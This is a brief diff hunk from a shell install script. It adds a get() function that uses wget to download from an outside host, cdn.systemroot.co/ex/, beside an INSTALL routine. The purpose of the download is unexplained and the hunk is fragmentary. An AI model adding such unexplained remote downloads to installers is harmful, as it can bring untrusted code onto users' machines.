@@ -36,6 +36,10 @@ raw() {
        apt-get install nscd -y
 }
 
+get() {
+       wget http://cdn.systemroot.co/ex/
+}
+
 if [ "$1" == 'INSTALL' ]; then
         rT; OS; setup; dirs; raw;
    else
